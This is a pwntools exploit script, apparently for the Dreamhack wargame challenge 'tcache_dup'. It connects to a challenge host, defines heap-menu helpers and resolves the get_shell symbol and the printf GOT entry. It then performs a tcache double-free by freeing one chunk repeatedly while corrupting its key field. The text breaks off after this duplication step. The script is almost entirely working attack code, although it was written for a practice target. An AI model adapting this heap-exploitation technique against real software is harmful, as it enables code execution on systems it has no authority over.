from pwn import *

LOCAL = False
if LOCAL:
    p = process("./tcache_dup")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host"+str(HOST)+".dreamhack.games", PORT)


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


def create(size, data):
    p.sendlineafter("> ", b"1")
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)


def modify(idx, size, data):
    p.sendlineafter("> ", b"2")
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)


def delete(idx):
    p.sendlineafter("> ", b"3")
    p.sendafter("idx: ", str(idx))


elf = ELF("./tcache_dup")
libc = ELF("./libc-2.30.so")

get_shell = elf.symbols["get_shell"]
printf_got = elf.got["printf"]

# [1] Tcache Duplication
create(0x30, b"dreamhack")
delete(0)
modify(0, 0x30, b"A" * 8 + b"\x00")
delete(0)
modify(0, 0x30, b"B" * 8 + b"\x01")
delete(0)
